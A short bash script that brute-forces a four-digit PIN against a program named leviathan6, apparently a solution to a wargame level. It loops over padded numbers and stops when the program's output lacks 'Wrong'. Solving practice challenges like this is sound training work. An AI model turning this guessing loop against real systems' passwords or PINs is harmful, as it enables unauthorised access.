#!/bin/bash

# USAGE: bash bruteforce.sh 0 10

for i in $(seq -f "%04g" $1 $2); do
    echo $i
    out=$(echo "exit" | ./leviathan6 $i | grep "Wrong" | wc -l)
    if [ "$out" == "0" ]; then
        echo "Password is $i"
        break
    fi
done

read